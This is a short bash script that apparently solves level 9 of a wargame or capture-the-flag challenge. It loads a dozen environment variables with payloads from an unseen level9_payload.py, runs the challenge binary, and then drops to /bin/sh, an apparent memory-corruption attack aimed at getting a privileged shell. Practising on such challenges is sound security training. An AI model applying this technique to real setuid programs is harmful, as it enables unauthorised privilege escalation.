#!/bin/bash
# myscript
export _=`python level9_payload.py _`
export FOO=`python level9_payload.py PWN`
export OWN=`python level9_payload.py PWN`
export PWN=`python level9_payload.py PWN`
export SHLVL=`python level9_payload.py SHLVL`
#export COLUMNS=`python level9_payload.py COLUMNS`
export PWD=`python level9_payload.py PWD`
export TERM=`python level9_payload.py TERM`
export USER=`python level9_payload.py TERM`
export LANG=`python level9_payload.py TERM`
export MAIL=`python level9_payload.py TERM`
export TMUX=`python level9_payload.py TERM`

#/home/shortman/9


./exec /var/challenge/level9/9

/bin/sh
